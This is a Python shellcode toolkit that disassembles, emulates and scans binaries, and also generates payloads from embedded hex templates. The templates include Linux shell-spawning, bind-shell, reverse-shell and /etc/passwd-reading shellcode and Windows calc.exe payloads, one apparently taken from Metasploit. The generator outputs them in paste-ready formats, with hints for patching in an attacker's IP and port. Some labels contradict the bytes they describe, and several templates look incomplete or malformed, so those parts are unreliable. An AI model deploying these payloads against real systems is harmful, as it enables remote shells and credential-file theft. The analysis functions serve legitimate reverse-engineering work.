#!/usr/bin/env python3
"""shellcode_tools.py — Shellcode 提取/反汇编/模拟/转换 工具集

Usage:
    python shellcode_tools.py extract <binary> [--offset 0x...] [--length N]
    python shellcode_tools.py disasm --arch x64|arm --hex <hex_string>
    python shellcode_tools.py disasm --arch x64|arm --file <shellcode.bin>
    python shellcode_tools.py generate --arch x64 --os linux --type exec_sh [--host IP] [--port PORT]
    python shellcode_tools.py strings --obfuscated <binary>
    python shellcode_tools.py emulate --arch x64 <shellcode.bin>
"""

from __future__ import annotations

import argparse
import sys


# ── Shellcode templates ────────────────────────────────────────────────────────

SHELLCODE_TEMPLATES = {
    "linux": {
        "x86": {
            "exec_sh": (
                "31c050682f2f7368682f62696e89e3505389e131d2b00bcd80",
                "execve('/bin/sh', ['/bin/sh', NULL], NULL) — 23 bytes"
            ),
            "exec_sh_compact": (
                "31c050682f2f7368682f62696e89e3b00bcd80",
                "execve('/bin/sh', ['/bin/sh'], NULL) — 18 bytes"
            ),
            "read_file": (
                "31c9f7e151682f657463682f2f7061682f2f2f7289e3b005cd80"
                "31d252682f2f6f75b206504089e3b003cd80b004b30189e1cd80",
                "cat /etc/passwd — ~50 bytes"
            ),
            "bind_shell": (
                "31c031db31c9b066b3015253506a0151b30289e1b066cd80"
                "89c6b066b302525389e152565389e1b002cd8031c9b102b03f"
                "cd8049b03fcd80b066b03bcd8051b066b03bb80c4f4f4ff7"
                "31c9b03bcd80",
                "Bind shell on port 4444 — ~80 bytes"
            ),
            "reverse_shell": (
                "31c031db31c9b066b3015253506a0151b30289e1b066cd8089c6",
                "Reverse shell connect-back — stub (use msfvenom for complete)"
            ),
        },
        "x64": {
            "exec_sh": (
                "4831d25248b82f62696e2f2f7368504889e752574889e6"
                "4831c0b03b0f05",
                "execve('/bin/sh', ['/bin/sh'], NULL) — 30 bytes"
            ),
            "exec_sh_minimal": (
                "31f648bf2f62696e2f2f7368574889e74831c0b03b4831f64831d20f05",
                "execve('/bin/sh', NULL, NULL) — 26 bytes"
            ),
            "bind_shell": (
                "4831c04831ff48f7e76a025f6a015e6a065a0f054889c7"
                "4831c0505e683a02115b6a105a4889e64883c6080f054831c0"
                "4831ff6a025ec7061111eb1b0f054831c06a215a488d35703d"
                "00000f054831c04831ffb0030f054831c0b03b4831ff488d3d"
                "e1ffffff0f05",
                "Bind shell on port 4445 — ~110 bytes"
            ),
            "reverse_shell": (
                "4831c04831ff4831f648f7e66a025f6a015e6a065a0f054889c7"
                "4883ec3048c7442420000111117f48c7442428020002"
                "bb10c1e410668944241c4889e66a105a0f054831f648ffc683"
                "c6100f8539ffffff4831c0b03b488d3d88ffffff0f05",
                "Reverse shell to 127.0.0.1:1111 — ~120 bytes"
            ),
            "read_file": (
                "48b8040000000000000010504889e6b002b9000000004889c7"
                "4831c00f054831fff7e748b82f6574632f7061734889e6"
                "4889c7b0024889e248b87373776400000050544889e6b002"
                "0f05b0010f05",
                "read /etc/passwd — ~80 bytes"
            ),
        },
    },
    "windows": {
        "x86": {
            "exec_calc": (
                "31c9648b71308b760c8b760c8b068b588b53186a0a"
                "687777772f682f2f2f63682e2e2e6568cac0c0c089e4"
                "ffd3",
                "WinExec('calc.exe') via kernel32 — ~45 bytes"
            ),
        },
        "x64": {
            "exec_calc": (
                "fc4883e4f0e8c0000000415141505251564831d265"
                "488b5260488b5218488b5220488b7250480fb74a4a"
                "4d31c94831c0ac3c617c022c2041c1c90d4101c1e2"
                "ed524151488b52208b423c4801d08b808800000048"
                "85c074674801d0508b4818448b40204901d0e35648"
                "ffc9418b34884801d64d31c94831c0ac41c1c90d41"
                "01c138e075f14c034c24084539d175d858448b4024"
                "4901d066418b0c48448b401c4901d0418b04884801"
                "d0415841585e595a41584159415a4883ec204152ff"
                "e05841595a488b12e957ffffff5d48ba0100000000"
                "000000488d8d0101000041ba318b6f87ffd5bbe0"
                "1d2a0a41baa695bd9dffd54883c4283c067c0a80"
                "fbe07505bb4713726f6a00594189daffd563616c"
                "632e65786500",
                "Full x64 calc.exe — reverse TCP shell stub (metasploit template)"
            ),
        },
    },
}


# ── Disassembly (Capstone-based if available, otherwise hex dump) ─────────────

def disassemble(data: bytes, arch: str, base_addr: int = 0x0) -> str:
    """Disassemble shellcode bytes."""
    try:
        import capstone
    except ImportError:
        return _hex_dump(data, base_addr)

    if arch == "x86":
        cs = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_32)
    elif arch == "x64":
        cs = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_64)
    elif arch in ("arm", "arm32"):
        cs = capstone.Cs(capstone.CS_ARCH_ARM, capstone.CS_MODE_ARM)
    elif arch == "arm64":
        try:
            cs = capstone.Cs(capstone.CS_ARCH_AARCH64, capstone.CS_MODE_ARM)
        except AttributeError:
            cs = capstone.Cs(capstone.CS_ARCH_ARM64, capstone.CS_MODE_ARM)
    elif arch == "thumb":
        cs = capstone.Cs(capstone.CS_ARCH_ARM, capstone.CS_MODE_THUMB)
    else:
        return _hex_dump(data, base_addr)

    cs.detail = True

    lines = []
    lines.append(f"{'Address':<12} {'Bytes':<24} {'Mnemonic':<10} Operands")
    lines.append("-" * 70)

    for insn in cs.disasm(data, base_addr):
        addr = f"0x{insn.address:08x}"
        byts = " ".join(f"{b:02x}" for b in insn.bytes).ljust(24)
        mnem = insn.mnemonic.ljust(10)
        op_str = insn.op_str
        lines.append(f"{addr}    {byts} {mnem} {op_str}")

    return "\n".join(lines)


def _hex_dump(data: bytes, base_addr: int = 0x0) -> str:
    """Fallback hex dump when Capstone is not available."""
    lines = []
    for i in range(0, len(data), 16):
        chunk = data[i:i+16]
        addr = f"0x{base_addr + i:08x}"
        hex_part = " ".join(f"{b:02x}" for b in chunk).ljust(48)
        ascii_part = "".join(chr(b) if 0x20 <= b < 0x7F else "." for b in chunk)
        lines.append(f"  {addr}  {hex_part}  |{ascii_part}|")
    return "\n".join(lines)


# ── Generation ────────────────────────────────────────────────────────────────

def generate_shellcode(arch: str, os_type: str, sc_type: str,
                       host: str = "", port: int = 0) -> str:
    """Generate shellcode from templates."""
    templates = SHELLCODE_TEMPLATES.get(os_type, {}).get(arch, {})
    if sc_type not in templates:
        available = list(templates.keys())
        return f"Error: '{sc_type}' not found for {arch}/{os_type}.\nAvailable: {available}"

    hex_str, desc = templates[sc_type]
    data = bytes.fromhex(hex_str)

    lines = []
    lines.append(f"# {os_type.title()} {arch} — {desc}")
    lines.append(f"# Size: {len(data)} bytes")
    lines.append("")

    if host and "reverse" in sc_type:
        lines.append(f"# !! Replace IP {host}:{port} in shellcode at the marked offset")
        lines.append(f"# !! Search for 0x7f000001 (127.0.0.1) or 0x{port:04x}{port:04x}")
        lines.append("")

    # Format as Python bytes
    lines.append("# Python bytes format:")
    py_str = "b'"
    for b in data:
        if 0x20 <= b < 0x7F and b not in (0x27, 0x5C):  # printable except ' and \
            py_str += chr(b)
        else:
            py_str += f"\\x{b:02x}"
    py_str += "'"
    lines.append(f"shellcode = {py_str}")
    lines.append(f"# len(shellcode) = {len(data)} bytes")
    lines.append("")

    # Format as C array
    lines.append("// C byte array:")
    c_arr = "unsigned char shellcode[] = {\n    "
    for i, b in enumerate(data):
        c_arr += f"0x{b:02x}, "
        if (i + 1) % 12 == 0:
            c_arr += "\n    "
    c_arr = c_arr.rstrip(", ") + "\n};"
    lines.append(c_arr)
    lines.append(f"// sizeof(shellcode) = {len(data)}")
    lines.append("")

    # Format as hex string
    lines.append("# Hex string:")
    lines.append(data.hex())
    lines.append("")
    lines.append(disassemble(data, arch))

    return "\n".join(lines)


# ── String deobfuscation ──────────────────────────────────────────────────────

def find_obfuscated_strings(data: bytes) -> list[dict]:
    """Detect common string obfuscation patterns."""
    findings = []

    # Pattern 1: Repeated XOR bytes → stack string construction
    # Look for sequences of mov [esp+...], 0xXX patterns
    # (simplified: look for high density of 0xC6 bytes = mov byte ptr)
    c6_count = data.count(b"\xc6")
    if c6_count > 10:
        findings.append({
            "type": "stack_string",
            "confidence": "medium",
            "detail": f"Found {c6_count} potential stack-string instructions (0xC6 byte patterns)"
        })

    # Pattern 2: Long sequences of byte loads
    # Look for repeated pattern: mov reg, val; xor reg, key; ...
    xor_sequences = _find_xor_patterns(data)
    if xor_sequences:
        findings.append({
            "type": "xor_encoded_strings",
            "confidence": "low",
            "detail": f"Found {len(xor_sequences)} potential XOR decode loops"
        })

    # Pattern 3: High concentration of non-printable bytes near string-like regions
    # (encrypted string table)
    encrypted_tables = _find_encrypted_tables(data)
    if encrypted_tables:
        findings.append({
            "type": "encrypted_data_table",
            "confidence": "low",
            "detail": f"Found {len(encrypted_tables)} high-entropy data regions near code"
        })

    return findings


def _find_xor_patterns(data: bytes) -> list[int]:
    """Find potential XOR decode loops (simple heuristic)."""
    offsets = []
    # Look for XOR reg, reg followed by loop
    xor_pattern = b"\x80\xF0"  # xor al, ...
    idx = 0
    while idx < len(data) - 4:
        idx = data.find(xor_pattern, idx)
        if idx == -1:
            break
        offsets.append(idx)
        idx += 1
    return offsets[:10]


def _find_encrypted_tables(data: bytes) -> list[dict]:
    """Find high-entropy regions near executable code."""
    from collections import Counter
    import math

    tables = []
    window = 256
    step = 128

    for start in range(0, len(data) - window, step):
        win = data[start:start + window]
        counts = Counter(win)
        total = len(win)
        ent = -sum((c / total) * math.log2(c / total) for c in counts.values()) if total > 0 else 0
        if ent > 7.5:
            tables.append({"offset": start, "entropy": round(ent, 3)})
        if len(tables) >= 10:
            break

    return tables


# ── Emulation (Unicorn-based if available) ────────────────────────────────────

def emulate_shellcode(data: bytes, arch: str, max_instructions: int = 10000):
    """Emulate shellcode and trace execution."""
    try:
        import unicorn
        from unicorn import (
            Uc, UC_ARCH_X86, UC_MODE_32, UC_MODE_64,
            UC_ARCH_ARM, UC_MODE_ARM,
            UC_PROT_READ, UC_PROT_WRITE, UC_PROT_EXEC,
        )
    except ImportError:
        return "unicorn not installed: pip install unicorn"

    BASE = 0x1000000
    STACK_BASE = 0x2000000
    STACK_SIZE = 2 * 1024 * 1024
    MEM_SIZE = 2 * 1024 * 1024

    if arch == "x86":
        uc = Uc(UC_ARCH_X86, UC_MODE_32)
    elif arch == "x64":
        uc = Uc(UC_ARCH_X86, UC_MODE_64)
    elif arch in ("arm", "arm32"):
        uc = Uc(UC_ARCH_ARM, UC_MODE_ARM)
    else:
        return f"Unsupported architecture for emulation: {arch}"

    uc.mem_map(BASE, MEM_SIZE, UC_PROT_READ | UC_PROT_EXEC)
    uc.mem_map(STACK_BASE, STACK_SIZE, UC_PROT_READ | UC_PROT_WRITE)

    uc.mem_write(BASE, data)

    # Set up stack
    if arch == "x64":
        uc.reg_write(unicorn.x86_const.UC_X86_REG_RSP, STACK_BASE + STACK_SIZE // 2)
    elif arch == "x86":
        uc.reg_write(unicorn.x86_const.UC_X86_REG_ESP, STACK_BASE + STACK_SIZE // 2)

    lines = []
    lines.append(f"Emulating {len(data)} bytes on {arch}...")
    lines.append("")

    insn_count = [0]
    prev_eip = [0]

    def hook_code(uc: Uc, address: int, size: int, user_data):
        if insn_count[0] >= max_instructions:
            uc.emu_stop()
            return
        insn_count[0] += 1
        if insn_count[0] <= 20:
            code = uc.mem_read(address, min(size, 15))
            byts = " ".join(f"{b:02x}" for b in code)
            lines.append(f"  [0x{address:08x}] {byts}")
        prev_eip[0] = address

    def hook_syscall(uc: Uc, user_data):
        # Log syscall if possible
        pass

    uc.hook_add(unicorn.UC_HOOK_CODE, hook_code)
    uc.hook_add(unicorn.UC_HOOK_INTR, hook_syscall)

    try:
        uc.emu_start(BASE, BASE + len(data), timeout=5000000, count=max_instructions)
    except unicorn.UcError as e:
        lines.append(f"Emulation error: {e}")
    except (OSError, ValueError) as e:
        lines.append(f"Exception: {e}")

    lines.append(f"Instructions executed: {insn_count[0]}")
    return "\n".join(lines)


# ── CLI ───────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="shellcode_tools — shellcode analysis, generation, and conversion toolkit")
    sub = parser.add_subparsers(dest="command")

    # extract
    p_extract = sub.add_parser("extract", help="Extract potential shellcode from binary")
    p_extract.add_argument("binary", help="Path to binary")
    p_extract.add_argument("--offset", default="0x0", help="Offset to start reading")
    p_extract.add_argument("--length", type=int, default=1024, help="Bytes to read")
    p_extract.add_argument("--size-only", action="store_true", help="Only show size")

    # disasm
    p_disasm = sub.add_parser("disasm", help="Disassemble shellcode")
    p_disasm.add_argument("--arch", required=True, choices=["x86", "x64", "arm", "arm64", "thumb"])
    p_disasm.add_argument("--hex", help="Hex string to disassemble")
    p_disasm.add_argument("--file", help="File containing shellcode")
    p_disasm.add_argument("--base", default="0x0", help="Base address")

    # generate
    p_gen = sub.add_parser("generate", help="Generate shellcode from template")
    p_gen.add_argument("--arch", required=True, choices=["x86", "x64"])
    p_gen.add_argument("--os", required=True, choices=["linux", "windows"])
    p_gen.add_argument("--type", required=True, dest="sc_type")
    p_gen.add_argument("--host", default="127.0.0.1")
    p_gen.add_argument("--port", type=int, default=4444)

    # strings
    p_str = sub.add_parser("strings", help="Extract and deobfuscate strings")
    p_str.add_argument("binary", help="Path to binary")
    p_str.add_argument("--obfuscated", action="store_true", help="Detect obfuscated string patterns")
    p_str.add_argument("--ascii", action="store_true", default=True)
    p_str.add_argument("--min-len", type=int, default=4)

    # emulate
    p_emu = sub.add_parser("emulate", help="Emulate shellcode")
    p_emu.add_argument("shellcode", help="Path to shellcode file")
    p_emu.add_argument("--arch", required=True, choices=["x86", "x64", "arm"])
    p_emu.add_argument("--max-insns", type=int, default=10000)

    args = parser.parse_args()

    if args.command == "extract":
        with open(args.binary, "rb") as f:
            offset = int(args.offset, 16)
            f.seek(offset)
            data = f.read(args.length)
        print(f"Read {len(data)} bytes from offset {args.offset}")
        if not args.size_only:
            print(disassemble(data, "x64", offset))

    elif args.command == "disasm":
        if args.hex:
            data = bytes.fromhex(args.hex)
        elif args.file:
            with open(args.file, "rb") as f:
                data = f.read()
        else:
            print("Error: provide --hex or --file", file=sys.stderr)
            sys.exit(1)
        base = int(args.base, 16)
        print(disassemble(data, args.arch, base))

    elif args.command == "generate":
        result = generate_shellcode(args.arch, args.os, args.sc_type, args.host, args.port)
        print(result)

    elif args.command == "strings":
        with open(args.binary, "rb") as f:
            data = f.read()
        if args.obfuscated:
            findings = find_obfuscated_strings(data)
            print(f"Obfuscated string analysis for {args.binary}:")
            for f_item in findings:
                print(f"  [{f_item['type']}] ({f_item['confidence']}) {f_item['detail']}")
        else:
            # Basic string extraction
            current = []
            for b in data:
                if 0x20 <= b <= 0x7E:
                    current.append(chr(b))
                else:
                    if len(current) >= args.min_len:
                        print("".join(current))
                    current = []
            if len(current) >= args.min_len:
                print("".join(current))

    elif args.command == "emulate":
        with open(args.shellcode, "rb") as f:
            data = f.read()
        print(emulate_shellcode(data, args.arch, args.max_insns))

    else:
        parser.print_help()


if __name__ == "__main__":
    main()
